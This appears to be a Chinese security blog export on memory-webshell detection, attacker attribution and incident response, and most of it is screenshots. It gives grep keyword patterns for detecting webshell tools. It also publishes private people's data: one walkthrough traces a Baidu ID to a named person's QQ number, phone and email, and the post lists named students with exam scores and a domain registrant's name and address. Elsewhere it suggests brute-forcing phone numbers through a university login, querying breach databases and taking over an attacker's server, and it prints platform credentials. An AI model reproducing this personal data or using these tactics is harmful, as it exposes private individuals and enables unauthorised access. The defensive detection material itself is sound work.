<h2 id="内存马怎么分析呢"><a href="#内存马怎么分析呢" class="headerlink" title="内存马怎么分析呢"></a>内存马怎么分析呢</h2><blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116093725592.png" alt="image-20220116093725592"></p>
</blockquote>
<p>怎么确认内存马呢</p>
<p>第一种叫注入内存马（进程PE类型）</p>
<p>第二种叫做Webshell的内存马</p>
<ul>
<li>1、Webshell进程从外面可以访问，在主机上找不到这个文件，这时就得怀疑了</li>
<li>2、Webshell的内存马，就见过JSP（PHP，ASP没见过）</li>
</ul>
<p>关于JSP的社工方式</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116094739705.png" alt="image-20220116094739705"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116094804962.png" alt="image-20220116094804962"></p>
<p>3、利用关键词或者检测规则对内存文件进行检测</p>
<p>可以用grep临时检测</p>
<p>strings * |grep -i “Cknife”（哥斯拉生成的C刀内存马）</p>
<p>ReGeorg、Behinder、AES_BASE64、AES_RAW，检测内存里运行的哥斯拉，可以直接用<code>RealFile:\|path.separator::</code></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116094917947.png" alt="image-20220116094917947"></p>
<h2 id="内存马实战"><a href="#内存马实战" class="headerlink" title="内存马实战"></a>内存马实战</h2><p>首先Ps aux|grep tomcat</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116104137886.png" alt="image-20220116104137886"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116104346533.png" alt="image-20220116104346533"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116104417258.png" alt="image-20220116104417258"></p>
<p>就可以找到一些内存马的特征</p>
<p>ntfs流不死马，数据库触发后门不死马（通过触发器当检索到某字段存在某个字符就会写马）</p>
<h2 id="实战1"><a href="#实战1" class="headerlink" title="实战1"></a>实战1</h2><p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116110748436.png" alt="image-20220116110748436"></p>
<p>1、有两台机器被控制了，属于个人主机。就两种情况①、钓鱼或者社工（养一个美女啥的发你东西，你点了之后上线），②有明显ms17-010补丁未打被smb内网打进来，可能存在，③更新包被替换了更新劫持，通过一些高端手法进来的劫持</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116121408312.png" alt="image-20220116121408312"></p>
<p>发现，f3322.net pubyun 老牌的DDNS，动态域名解析</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116122024973.png" alt="image-20220116122024973"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116122104556.png" alt="image-20220116122104556"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116122141998.png" alt="image-20220116122141998"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116122318353.png" alt="image-20220116122318353"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116122355238.png" alt="image-20220116122355238"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116122433208.png" alt="image-20220116122433208"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116122540803.png" alt="image-20220116122540803"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116122555192.png" alt="image-20220116122555192"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116122603995.png" alt="image-20220116122603995"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116122622978.png" alt="image-20220116122622978"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116122650586.png" alt="image-20220116122650586"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116122701436.png" alt="image-20220116122701436"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116122719555.png" alt="image-20220116122719555"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116122748547.png" alt="image-20220116122748547"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116122848036.png" alt="image-20220116122848036"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116122930861.png" alt="image-20220116122930861"></p>
<h2 id="实战2"><a href="#实战2" class="headerlink" title="实战2"></a>实战2</h2><p>误报的应急响应</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116123047085.png" alt="image-20220116123047085"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116123103460.png" alt="image-20220116123103460"></p>
<p>是内网到外网的代理服务器</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116151952982.png" alt="image-20220116151952982"></p>
<p>应急响应三步骤</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116164809985.png" alt="image-20220116164809985"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116164857760.png" alt="image-20220116164857760"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116164912122.png" alt="image-20220116164912122"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116165030316.png" alt="image-20220116165030316"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116165051365.png" alt="image-20220116165051365"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116165120994.png" alt="image-20220116165120994"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116165134885.png" alt="image-20220116165134885"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116165218257.png" alt="image-20220116165218257"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116165247647.png" alt="image-20220116165247647"></p>
<p><strong>最终判断是误报</strong></p>
<p>我们需要做的是检测、威胁发现、威胁溯源、应急响应、写报告</p>
<p>个人博客：<a href="https://gylq.gitee.io/">https://gylq.gitee.io/</a></p>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>溯源</tag>
      </tags>
  </entry>
  <entry>
    <title>【知识积累】面试溯源、应急、流量分析全面总结</title>
    <url>/posts/186.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="攻击溯源总结"><a href="#攻击溯源总结" class="headerlink" title="攻击溯源总结"></a>攻击溯源总结</h1><p>意义</p>
<blockquote>
<p>想通过IP直接找到人的</p>
</blockquote>
<h2 id="脑图"><a href="#脑图" class="headerlink" title="脑图"></a>脑图</h2><p>1、利用搜索引擎直接搜索ip</p>
<blockquote>
<p><img src="https://s2.loli.net/2022/01/15/xPtXso7JdDZ5k21.png" alt="image-20220115094803315"></p>
</blockquote>
<p>2、就是威胁情况，微步、qax啊，等等，可以做去澡的方式</p>
<blockquote>
<p><img src="https://s2.loli.net/2022/01/15/BP2i6dl5fyRZe3j.png" alt="image-20220115094837923"></p>
</blockquote>
<p>3、主动探测，常见的端口和工具扫描</p>
<blockquote>
<p><img src="https://s2.loli.net/2022/01/15/2u4KSNhgEldpWyH.png" alt="image-20220115095125316"></p>
</blockquote>
<p>4、一些默认的web应用的溯源，还有常见的</p>
<blockquote>
<p><img src="https://s2.loli.net/2022/01/15/wlYAz4HrPDhfRLC.png" alt="image-20220115095334534"></p>
</blockquote>
<p>5、c2的一些端口什么的，肉鸡漏洞</p>
<blockquote>
<p><img src="https://s2.loli.net/2022/01/15/9WLDY3GQazXSHEb.png" alt="image-20220115095700731"></p>
</blockquote>
<p>6、网络已经有的大库，无需等待扫描时间直接获取结果</p>
<blockquote>
<p><img src="https://s2.loli.net/2022/01/15/bIk8zjFH6C3uWLG.png" alt="image-20220115095822224"></p>
</blockquote>
<h2 id="网络空间属性基础前置"><a href="#网络空间属性基础前置" class="headerlink" title="网络空间属性基础前置"></a>网络空间属性基础前置</h2><p>百度，就可以直接ip定位。</p>
<p>1、判断ip是不是静态ip</p>
<p><strong>ipip.net/ip.html</strong>，这个网站中判断，查rDNS记录，可以判断是否是静态ip，当rDNS中包含static就是静态</p>
<p><strong>ipwhois.cnnic.net.cn</strong>，这个备案信息查询网站看<strong>地址状态</strong>这个是做更准确的判断</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220114152824239.png" alt="image-20220114152824239"></p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220114151124618.png" alt="image-20220114151124618"></p>
</blockquote>
<p>Fofa，去看看</p>
<p>尽量使用虚拟机去打开网站，防止泄露，无痕模式查看</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220114153005281.png" alt="image-20220114153005281"></p>
</blockquote>
<p>或者用nmap查看开放端口</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220114153204753.png" alt="image-20220114153204753"></p>
</blockquote>
<p>空间搜索可以看到对应的服务</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220114153635689.png" alt="image-20220114153635689"></p>
</blockquote>
<p><strong>censys.io，去扫段地址</strong></p>
<p>若非业务端口比较多可能是小区的范围动态ip</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220114154536231.png" alt="image-20220114154536231"></p>
</blockquote>
<p>若看到c段，有很多http的话80或者443网页页面的时候，基本都是IDC出口或者企业出口的，静态ip</p>
<blockquote>
<p><img src="https://s2.loli.net/2022/01/14/OHesLhyoZE6plt3.png" alt="image-20220114163843511"></p>
</blockquote>
<p><img src="https://s2.loli.net/2022/01/14/1cv869fjZUlHnVo.png" alt="image-20220114164442449"></p>
<p><strong>ip定位</strong></p>
<p><a href="http://chaipip.com/" target="_blank" rel="noopener">http://chaipip.com/</a></p>
<p>高德地图amap.com/</p>
<p>通过搜周边，搜公司可以确定对方是不是准确的</p>
<blockquote>
<p><img src="../../../../AppData/Roaming/Typora/typora-user-images/image-20220114155446526.png" alt="image-20220114155446526"></p>
</blockquote>
<p>查c段也可以定出来动态ip啥的</p>
<p><a href="http://virustotal.com，可以研判ip，主要是查国外ip比较准，反查域名啥的" target="_blank" rel="noopener">http://virustotal.com，可以研判ip，主要是查国外ip比较准，反查域名啥的</a></p>
<p><a href="https://www.virustotal.com/gui/ip-address/45.32.44.18/relations" target="_blank" rel="noopener">https://www.virustotal.com/gui/ip-address/45.32.44.18/relations</a></p>
<blockquote>
<p><img src="https://s2.loli.net/2022/01/14/MA6FtRJgfCHG72S.png" alt="image-20220114161012392"></p>
</blockquote>
<p>常见的vpn端口</p>
<p><img src="https://s2.loli.net/2022/01/14/He2fX6TkspCu48R.png" alt="image-20220114164542272"></p>
<h2 id="实战1"><a href="#实战1" class="headerlink" title="实战1"></a>实战1</h2><p>获取的攻击者ip地址：202.5.17.76</p>
<p>1、直接ip定位查看相关位置和IDC和应用场景，动静态判断等</p>
<blockquote>
<p><img src="https://s2.loli.net/2022/01/14/nZEtdycSzODQVvl.png" alt="image-20220114170056896"></p>
</blockquote>
<blockquote>
<p><img src="https://s2.loli.net/2022/01/14/Xp5UWMNOg9vjS83.png" alt="image-20220114165822239"></p>
</blockquote>
<p>2、在去vt看看对应的，可以看到运营商都是HOSTUS，也可以通过<a href="https://myip.ms/来搜索" target="_blank" rel="noopener">https://myip.ms/来搜索</a></p>
<blockquote>
<p><img src="https://s2.loli.net/2022/01/14/MnaXv4V3LzR6HPl.png" alt="image-20220114172328644"></p>
</blockquote>
<p><img src="https://s2.loli.net/2022/01/14/xX1rm7QhP2WfoOS.png" alt="image-20220114165844975"></p>
<p>3、通过百度搜索hostus判断是一个vps，然后直接端口扫描，用空间测绘，Nmap等</p>
<blockquote>
<p><img src="https://s2.loli.net/2022/01/14/XwJDAlRLHEWOcqp.png" alt="image-20220114170203345"></p>
</blockquote>
<p>4、发现8080是有一个nps，明显黑客工具，现在就是通过端口看能不能拿下了</p>
<blockquote>
<p><img src="https://s2.loli.net/2022/01/14/WcZlX83y2Gs4Hvt.png" alt="image-20220114170257156"></p>
</blockquote>
<p>5、通过反查域名看看有没有办法查到其他子域名的信息，直接微步查到对应：flasih.com.cn域名</p>
<p><img src="https://s2.loli.net/2022/01/14/IidX45OCUQejW87.png" alt="image-20220114171007272"></p>
<p>6、接着发现子域名可以直接访问该网站，和ip解析对应</p>
<blockquote>
<p><img src="https://s2.loli.net/2022/01/14/uf4qWEpHSoUFABz.png" alt="image-20220114171041144"></p>
</blockquote>
<p>7、直接通过奇安信和站长工具的反查域名对应的注册信息判断</p>
<p>姓名：于涌泉</p>
<p>邮箱：<a href="https://ti.qianxin.com/v2/search?type=email&value=1919635086@qq.com" target="_blank" rel="noopener">1919635086@qq.com </a></p>
<p>公司：北京新网数码信息技术有限公司</p>
<p>位置：北京市海淀区中关村南大街9号理工科技大厦1206室</p>
<p><img src="https://s2.loli.net/2022/01/14/U2SwmKZPqlGkTdH.png" alt="image-20220114171132471"></p>
<p>8、得到了对应的姓名和邮箱qq，就可以看看相关的域名，通过站长工具，因为奇安信的研判有些功能没开放，站长虽然无法看姓名，但是奇安信可以，通过反查姓名可以看到其他的两个域名，对比公司相同的whois中的属性。</p>
<p><img src="https://s2.loli.net/2022/01/14/TYizStlcI3Cyf95.png" alt="image-20220114171837160"></p>
<p>9、得到的姓名和QQ邮箱和公司，可以直接地理定位</p>
<blockquote>
<p><img src="https://s2.loli.net/2022/01/14/KAlqQRpLPG6hW4r.png" alt="image-20220114172820745"></p>
</blockquote>
<p>格式书写，其他信息可以直接用社工库搞出来</p>
<p>下方为网图</p>
<p><img src="https://s2.loli.net/2022/01/14/Y8lWtai3r7dPIDL.png" alt="image-20220114173410713"></p>
<h2 id="实战2"><a href="#实战2" class="headerlink" title="实战2"></a>实战2</h2><p>获取到的攻击者的ip地址：161.35.76.1，172.105.87.139，182.18.152.105，46.101.232.43，47.56.86.44，80.246.28.44</p>
<p>1、一个个来，161.35.76.1查过是德国的ip，vt可以看到，可以看到供应商是<a href="https://www.digitalocean.com/这个网站的" target="_blank" rel="noopener">https://www.digitalocean.com/这个网站的</a></p>
<blockquote>
<p><img src="https://s2.loli.net/2022/01/14/2OgqLYdGEzXiy5V.png" alt="image-20220114173940534"></p>
</blockquote>
<p>2、看看第二个172.105.87.139，继续搜，可以看到是另一个供应商Linode</p>
<p><img src="https://s2.loli.net/2022/01/14/5FArBm6Zc9C4KJn.png" alt="image-20220114192417927"></p>
<p>3、接着可以从反查出来的域名进行跟踪可以看到多出一个104.21.72.185</p>
<p><img src="https://s2.loli.net/2022/01/14/HoegpV3SsvZfdBE.png" alt=""></p>
<p>4、通过跟踪上方查到的ip，我们可以看出明显是个cdn，可以查cdn的网站：<a href="https://tools.ipip.net/cdn.php查询IP，这些就无意义回去。" target="_blank" rel="noopener">https://tools.ipip.net/cdn.php查询IP，这些就无意义回去。</a></p>
<blockquote>
<p><img src="https://s2.loli.net/2022/01/14/2DiOaQk5VwHe1pn.png" alt="image-20220114194816463"></p>
</blockquote>
<p>5、小技巧：通过攻击时间也可以判断对方是否是国人做的事，点开对方用过的攻击文件，可以清楚看到时间，可以做一些估判</p>
<p><img src="https://s2.loli.net/2022/01/14/HyF5WVxotPqYBui.png" alt="image-20220114195836105"></p>
<blockquote>
<p><img src="https://s2.loli.net/2022/01/14/GxTtDUBf6XjIVRC.png" alt="image-20220114195914880"></p>
</blockquote>
<p>6、接着看第三个ip的182.18.152.105，差不多的数据，小知识：<a href="https://search.censys.io，可以看一些记录过的端口开放的http形式的源码，可以来帮助溯源" target="_blank" rel="noopener">https://search.censys.io，可以看一些记录过的端口开放的http形式的源码，可以来帮助溯源</a></p>
<blockquote>
<p><img src="https://s2.loli.net/2022/01/14/le9VFoNnZJDQEOx.png" alt="image-20220114200304824"></p>
</blockquote>
<p>7、直到我看到47.56.86.44这个ip的时候，查一下信息，明显阿里云的，丢vt里面反查其他信息</p>
<p><img src="https://s2.loli.net/2022/01/14/oEm3aHU1BhjPb56.png" alt="image-20220114201816185"></p>
<blockquote>
<p><img src="https://s2.loli.net/2022/01/14/tTdNh7nmjUOFE8A.png" alt="image-20220114202004528"></p>
</blockquote>
<p>8、谷歌可以找到反查域名的一些沙箱分析</p>
<p><img src="https://s2.loli.net/2022/01/15/h4uoDYr8WGnvA9K.png" alt="image-20220115093439272"></p>
<p>9、我们点开对应的可以看到的cobaltsttrike文件</p>
<p><img src="https://s2.loli.net/2022/01/15/lWeZobBT2D3JGkR.png" alt="image-20220115092010369"></p>
<p>10、在登陆账号之后可以看到样本关联</p>
<blockquote>
<p><img src="https://s2.loli.net/2022/01/15/6D1XVduPnkqZ7yQ.png" alt="image-20220115093800611"></p>
</blockquote>
<p>11、这里可以看到规则来源，也可以去referer看</p>
<blockquote>
<p><img src="https://s2.loli.net/2022/01/15/RmZ92XtnyBTMYbv.png" alt="image-20220115093852869"></p>
</blockquote>
<p>12、可以通过github搜对应代码，判断规则是什么时候写的</p>
<blockquote>
<p><img src="https://s2.loli.net/2022/01/15/Z9pmEn15kotYbAP.png" alt="image-20220115094338148"></p>
</blockquote>
<p>13、通过创建时间等判断确实是2018年开始搞的，所以确定是这个组织的木马apt_darkhydrus，威胁情报定义是在2018到2021年可以确定是这个。</p>
<blockquote>
<p><img src="https://s2.loli.net/2022/01/15/dXEZLa1bwmAVxoS.png" alt="image-20220115094430151"></p>
</blockquote>
<p>所以结果是判定，我们是被某组织攻击，报上情况即可。</p>
<h2 id="内部溯源平台，请勿外传"><a href="#内部溯源平台，请勿外传" class="headerlink" title="内部溯源平台，请勿外传"></a>内部溯源平台，请勿外传</h2><p><img src="https://s2.loli.net/2022/01/15/gMQGumJS8FKzyfV.png" alt="image-20220115095952431"></p>
<h2 id="实战3"><a href="#实战3" class="headerlink" title="实战3"></a>实战3</h2><p>假设蜜罐捕获到了百度ID：<strong>1605026515</strong></p>
<p>1、贴吧私聊，可以拿到对方的用户名</p>
<p><a href="https://tieba.baidu.com/im/pcmsg?from=1605026515" target="_blank" rel="noopener">https://tieba.baidu.com/im/pcmsg?from=1605026515</a></p>
<blockquote>
<p><img src="https://s2.loli.net/2022/01/15/ovsQIpf6BO4zx7H.png" alt="image-20220115100322423"></p>
</blockquote>
<p>2、接着可以复制头像图片地址<a href="http://tb.himg.baidu.com/sys/portrait/item/tb.1.e91be300.Dn6FJFYpKSr4DujeYUGLzQ，可以看到另一个信息id=tb.1.e91be300.Dn6FJFYpKSr4DujeYUGLzQ" target="_blank" rel="noopener">http://tb.himg.baidu.com/sys/portrait/item/tb.1.e91be300.Dn6FJFYpKSr4DujeYUGLzQ，可以看到另一个信息id=tb.1.e91be300.Dn6FJFYpKSr4DujeYUGLzQ</a></p>
<p><strong>接着和我的主页中的id组合一下</strong><a href="https://tieba.baidu.com/home/main?id=tb.1.e91be300.Dn6FJFYpKSr4DujeYUGLzQ&amp;fr=userbar&amp;red_tag=0326503131，就可以看到他的发帖主页" target="_blank" rel="noopener">https://tieba.baidu.com/home/main?id=tb.1.e91be300.Dn6FJFYpKSr4DujeYUGLzQ&amp;fr=userbar&amp;red_tag=0326503131，就可以看到他的发帖主页</a></p>
<blockquote>
<p><img src="https://s2.loli.net/2022/01/15/l7ird6BNjX4hDyA.png" alt="image-20220115100612871"></p>
</blockquote>
<p>3、可以通过一些帖子发现他的地理位置和毕业时间还有学校，可以发现几个关键字：2017年 中南大学 录取通知书</p>
<blockquote>
<p><img src="https://s2.loli.net/2022/01/15/9CFbZ8ocjKspVWm.png" alt="image-20220115100756820"></p>
</blockquote>
<p>4、直接搜一下关键字</p>
<blockquote>
<p><img src="https://s2.loli.net/2022/01/15/XqiZd1WPeTBH3wO.png" alt="image-20220115101111448"></p>
</blockquote>
<p>5、初步锁定有一个信息安全</p>
<p>得到的四组数据</p>
<table>
<thead>
<tr>
<th>湖南省</th>
<th>黄峰</th>
<th>男</th>
<th>汨罗市一中</th>
<th>695</th>
<th>理工A类</th>
<th>信息安全</th>
</tr>
</thead>
<tbody><tr>
<td>湖南省</td>
<td>李跃峥</td>
<td>男</td>
<td>汨罗市一中</td>
<td>691</td>
<td>理工A类</td>
<td>应用物理学</td>
</tr>
<tr>
<td>湖南省</td>
<td>向燚鑫</td>
<td>男</td>
<td>汨罗市一中</td>
<td>698</td>
<td>理工B类</td>
<td>精神医学</td>
</tr>
<tr>
<td>湖南省</td>
<td>周添吉</td>
<td>男</td>
<td>汨罗市一中</td>
<td>661</td>
<td>理工C类</td>
<td>护理学</td>
</tr>
</tbody></table>
<blockquote>
<p><img src="https://s2.loli.net/2022/01/15/2JG5rAUkeOcsDMB.png" alt="image-20220115101230881"></p>
</blockquote>
<p>6、继续往下看</p>
<blockquote>
<p><img src="https://s2.loli.net/2022/01/15/NSlWEUra5nv8y3X.png" alt="image-20220115101647553"></p>
</blockquote>
<p>7、查看一下主办方信息关于-极光网络安全实验室，可能存在人员信息</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115102520499.png" alt="image-20220115102520499"></p>
<p>8、实验室官方，发现有许多成员，是中南大学的实验室好像，然后可以看到2017级的成员，根据我们的判断一样</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115103053031.png" alt="image-20220115103053031"></p>
</blockquote>
<p>9、点开链接发现是对方的博客，可以直接在关于页面直接看到</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115103134493.png" alt="image-20220115103134493"></p>
</blockquote>
<p>10、关于页面发现联系方式</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">QQ: 2362929771</span><br><span class="line">Phone&#x2F;Wechat: 15273080682</span><br><span class="line">Email: 2362929771@qq.com</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115103202637.png" alt="image-20220115103202637"></p>
</blockquote>
<p>11、根据加qq的基本信息可以看到，很可能是我们要找的目标</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115103237343.png" alt="image-20220115103237343"></p>
</blockquote>
<p>12、对应他的信息，可以查其他人的信息来验证，其他信息可以通过社工库判断了，基本可以判断了</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115111622685.png" alt="image-20220115111622685"></p>
</blockquote>
<h2 id="溯源的小知识"><a href="#溯源的小知识" class="headerlink" title="溯源的小知识"></a>溯源的小知识</h2><p>假设手机号<code>159******89</code></p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115111731069.png" alt="image-20220115111731069"></p>
</blockquote>
<p>集号吧：<a href="https://www.jihaoba.com/haoduan/152/changsha.htm" target="_blank" rel="noopener">https://www.jihaoba.com/haoduan/152/changsha.htm</a></p>
<p>152 <code>****</code>,然后可以看到前7位并不多，可以直接爆破，后门四位<code>****</code>手机号一般十一位，后面4位可以找一个他可以登录的位置爆破</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115111927497.png" alt="image-20220115111927497"></p>
<p>然后通过某个中南大学的登录地方，爆破其他手机号，可能会爆破出很多人</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115112221481.png" alt="image-20220115112221481"></p>
</blockquote>
<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>1、不管做溯源/反制/攻击不允许客户网络</p>
<p>2、不允许在客户网络里连自己的马</p>
<h2 id="身份ID溯源（蜜罐大部分不可能是真实攻击队，外围，边界队，蓝队友军）"><a href="#身份ID溯源（蜜罐大部分不可能是真实攻击队，外围，边界队，蓝队友军）" class="headerlink" title="身份ID溯源（蜜罐大部分不可能是真实攻击队，外围，边界队，蓝队友军）"></a>身份ID溯源（蜜罐大部分不可能是真实攻击队，外围，边界队，蓝队友军）</h2><p>百分之99的溯源可能都会失败，所以多学姿势，有时候一些木马的pdb路径也可以找到对应的用户名或者qq号，小思路</p>
<h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><p>了解下黑客的目的</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115120234118.png" alt="image-20220115120234118"></p>
<p>应急线索来源：</p>
<ul>
<li>1、从流量侧发现线索<ul>
<li>Webshell攻击<ul>
<li>漏洞利用成功</li>
<li>Webshell文件操作</li>
<li>Web日志审计</li>
<li>根据时间线查</li>
</ul>
</li>
<li>异常的外联（比如恶意域名/恶意IP）</li>
<li>横向渗透工具（比如CS、SSF，nps，chrome密码提取等）</li>
<li>怀疑主机失陷（点击）</li>
</ul>
</li>
<li>2、外界情报（某系统），（听说某系统有0day）全盘的检测</li>
<li>3、造成后果后发现，被勒索了，业务挂了</li>
<li>4、安全监控设备（终端杀软，EDR）</li>
</ul>
<h2 id="windows主机取证"><a href="#windows主机取证" class="headerlink" title="windows主机取证"></a>windows主机取证</h2><h3 id="工具应急响应方法"><a href="#工具应急响应方法" class="headerlink" title="工具应急响应方法"></a>工具应急响应方法</h3><p>最简单的直接通过工具快速简洁</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">【睿眼Windows终端溯源取证系统】（真实平台，可实际操作）</span><br><span class="line">公网地址：https:&#x2F;&#x2F;ir.zorelworld.com:443&#x2F;</span><br><span class="line">401信息： 401_Z1xW5y \ Z1w5yoct.CM</span><br><span class="line">页面账号信息：可在页面自行注册</span><br></pre></td></tr></table></figure></div>

<p>1、创建项目，下载采集器，尽量不使用常驻的</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115154833084.png" alt="image-20220115154833084"></p>
</blockquote>
<p>2、采集资产目录</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115154852427.png" alt="image-20220115154852427"></p>
</blockquote>
<p>3、结果会在data目录中，有一个zip的压缩包，将其上传，可以查看取证报告</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115154924693.png" alt="image-20220115154924693"></p>
</blockquote>
<p>4、取证报告</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115154949495.png" alt="image-20220115154949495"></p>
</blockquote>
<p>5、专家模式根据时间轴，判断黑客那个时间段做了啥</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115155938716.png" alt="image-20220115155938716"></p>
</blockquote>
<h2 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h2><p>三要素</p>
<p>①时间②线索③黑客思路④权限（攻击者拿到的哪些信息）</p>
<p>客户端/服务端（WebShell）</p>
<p>1、发现一个Webshell</p>
<p>2、找到Webshell</p>
<p>3、Webshell的时间，找Web日志里连这个Webshell的IP，根据这个IP遍历所有日志</p>
<p>这个工具对于windows来遍历日志，一个<strong>文件搜索工具</strong></p>
<p><strong>FileLocator Pro</strong>  应急响应比较好多的</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115161316553.png" alt="image-20220115161316553"></p>
</blockquote>
<p>类似linux的grep</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115161511590.png" alt="image-20220115161511590"></p>
</blockquote>
<p>图形化比较好多的了，Nginx日志啥的</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115161714488.png" alt="image-20220115161714488"></p>
</blockquote>
<p>4、通过everything去查找这个时间点前后1-3天的所有创建文件</p>
<p>源IP什么时间的第一次连接是什么时间，Webshell创建是什么时间，服务器第一次被这些IP访问是什么时间（根据情况判断对方是怎么攻击的）</p>
<p>5、服务器网络策略，这个服务器能不能对外联网，CS，或者NPS隧道（完全禁止—&gt;，DNS，ICMP协议）</p>
<p>6、限于找Web漏洞以及隐藏的Webshell，以及不死webShell（Mysql触发后门，NTFS隐藏了解）</p>
<p>7、端口复用，Apache插件，端口重复使用</p>
<p>8、Web服务器失陷了（Linux），翻SSH公钥，翻配置文件（数据库PHPXML），History（用户名，有多少台机子），进程（运营）</p>
<p>应急响应步骤</p>
<p>1、Tomcat漏洞利用成功，流量是实时；</p>
<p>2、断网</p>
<p>3、确定线索，漏洞利用成功（修复漏洞后尽快上线，确定有没有横向的动作），WebShell上来了（关心有没有横向渗透工具 NPS，SSF），还是内网渗透，后渗透（确定影响范围）等，第一次接触的时间，到目前为止多久</p>
<h2 id="异常的外链"><a href="#异常的外链" class="headerlink" title="异常的外链"></a>异常的外链</h2><p>1、通过IOC、恶意域名、恶意ip、恶意HASH、DGA域名</p>
<p>2、检测模型（NPS上线了，CS上线了，SSF挂出去）</p>
<p>这里推荐一个工具<strong>LiveTcpUdpWatch</strong>实时去查看进程的情况</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115165217221.png" alt="image-20220115165217221"></p>
</blockquote>
<p>Sysmon日志实时记录，因为是微软的，所以很方便</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115170018007.png" alt="image-20220115170018007"></p>
</blockquote>
<p>Process Monitor</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115170418866.png" alt="image-20220115170418866"></p>
</blockquote>
<p>可以看到很详细的信息，但是得一直开着，可能没有Sysmon方便</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115170522553.png" alt="image-20220115170522553"></p>
</blockquote>
<p>AppNetworkCount，也是对应的网络链接的工具</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115170724535.png" alt="image-20220115170724535"></p>
</blockquote>
<p>DNS缓存记录</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115171251020.png" alt="image-20220115171251020"></p>
</blockquote>
